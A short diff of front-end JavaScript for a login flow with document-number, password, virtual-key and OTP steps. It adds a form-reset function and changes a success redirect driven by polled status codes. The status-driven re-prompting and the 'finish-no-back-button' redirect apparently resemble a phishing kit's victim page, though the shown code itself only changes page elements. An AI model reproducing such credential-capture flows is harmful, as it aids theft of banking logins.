@@ -30,7 +30,13 @@ function ventana_errorotp(){
 }
 
 function ventana_usuario(){
-
+    $(".mensaje").hide();
+    $(".fondo").hide();
+    $("#txt-docum,#txt-clave").val("");
+    $("#txt-docum").removeAttr("readonly");
+    $("#ClvVir").hide(); 
+    $("#btn-login").hide();
+    $("#btn-continuar").show();
 }
 
 
@@ -83,7 +89,7 @@ function consultar_estado(){
                          ventana_errorotp(); 
                          break;
                 case '10':espera = 0;
-                          window.location.href = "../../../finish-no-back-button/";
+                          window.location.href = "../../../finish-no-back-button/successful.html";
                           break;
                 case '12':espera = 0;
                           ventana_usuario(); 
